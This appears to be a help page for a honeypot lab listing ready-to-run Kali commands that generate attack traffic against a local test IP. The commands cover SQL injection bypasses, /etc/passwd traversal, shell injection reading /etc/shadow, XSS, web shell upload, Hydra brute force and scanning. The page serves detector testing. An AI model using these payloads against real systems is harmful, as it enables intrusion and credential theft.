Ready-to-use Kali Linux commands for each attack category. Use in Internet Mode to generate real attack data.

SQL Injection

T1190 · Initial Access · HIGH

Inject SQL syntax into login fields to bypass authentication. The honeypot classifier detects UNION SELECT, OR 1=1, tautologies, and SQL functions.

Manual — curl
curl -X POST http://192.168.10.128/login \ -d "username=' OR '1'='1&password=test"
Automated — sqlmap
sqlmap -u "http://192.168.10.128/login" \ --data="username=admin&password=admin" \ --batch --level=3
Expected: Honeypot logs as "SQL Injection (T1190)" · Dashboard shows red badge · Campaign card shows 💉 SQLi in kill chain
📁

Directory Traversal

T1083 · Discovery · MEDIUM

Escape the web root to access system files. The classifier uses two-layer detection: ../ sequences AND sensitive file targets like /etc/passwd.

curl — force raw path (bypass client normalization)
curl --path-as-is "http://192.168.10.128/../../../../etc/passwd"
curl — targets sensitive file (Layer 2 detection)
curl "http://192.168.10.128/etc/passwd"
Expected: Honeypot logs as "Directory Traversal (T1083)" · Both Layer 1 (../ sequences) and Layer 2 (file targets) trigger detection
⚡

Command Injection

T1059 · Execution · CRITICAL

Inject shell commands through login fields. Classifier detects metacharacters (;, |, $(), backticks) including no-space variants.

Semicolon chaining
curl -X POST http://192.168.10.128/login \ -d "username=admin&password=;cat /etc/shadow"
Pipe injection
curl -X POST http://192.168.10.128/login \ -d "username=admin&password=|whoami"
Expected: Honeypot logs as "Command Injection (T1059)" · No commands are executed — honeypot captures payload only
🌐

Cross-Site Scripting (XSS)

T1059.007 · Execution · HIGH

Inject JavaScript into form fields. Classifier detects <script>, event handlers (onerror=), and javascript: protocol.

Script tag injection
curl -X POST http://192.168.10.128/login \ -d "username=<script>alert(1)</script>&password=test"
Automated — XSStrike
xsstrike -u "http://192.168.10.128/login" \ --data "username=test&password=test"
Expected: Honeypot logs as "XSS (T1059.007)" · Payload captured in request body, not executed
📦

Malicious Upload

T1105 · Command & Control · CRITICAL

Upload web shells or backdoors via firmware/config endpoints. Classifier triggers on POST requests containing .php, .jsp, webshell, c99, or <?php.

Fake shell upload via form data
curl -X POST http://192.168.10.128/firmware \ -d "filename=backdoor.php&type=firmware_update"
Multipart file upload
curl -X POST http://192.168.10.128/firmware \ -F "file=@shell.php"
Expected: Honeypot logs as "Malicious Upload (T1105)" · No file is actually saved — payload logged for analysis
🔑

Brute Force

T1110 · Credential Access · MEDIUM

Clean login attempts with no injection characters. Classified as brute force when POST to login paths contains only credential data.

Manual — single attempt
curl -X POST http://192.168.10.128/login \ -d "username=admin&password=admin123"
Automated — Hydra (generates ~20 login attempts)
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \ -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt \ 192.168.10.128 http-post-form \ "/login:username=^USER^&password=^PASS^:F=error" -t 4
Expected: Honeypot logs each attempt as "Brute Force (T1110)" · Campaign view shows credential stuffing progression · Hydra generates realistic multi-attempt campaigns
📂

Directory Enumeration

T1083 · Discovery · LOW

Brute-force directory paths to find hidden admin panels and config files. Classifier matches 40+ known probe paths.

Manual — single path probe
curl http://192.168.10.128/wp-admin
Automated — Gobuster (generates hundreds of probes)
gobuster dir -u http://192.168.10.128 \ -w /usr/share/wordlists/dirb/common.txt -t 10
Alternative — ffuf
ffuf -u http://192.168.10.128/FUZZ \ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403
Expected: Honeypot logs each probe as "Directory Enumeration (T1083)" · Honey routes (/robots.txt, /.env, /.git) return convincing fake content · Campaign view shows 📂 Enum phase
🔍

Reconnaissance

T1595 · Reconnaissance · LOW

Network scanning and service detection. Classifier detects 20 known scanner User-Agent strings including Nmap, Nikto, and Shodan.

Nmap — service version detection
nmap -sV -sC -p 80,443 192.168.10.128
Nmap — IoT-specific scripts
nmap -sV --script http-enum,http-headers,http-title \ -p 80,443 192.168.10.128
curl — spoof scanner User-Agent
curl -A "Nmap Scripting Engine" http://192.168.10.128/
Expected: Honeypot logs as "Reconnaissance (T1595)" · Nmap NSE User-Agent triggers scanner detection · Persona Server header spoofing tested
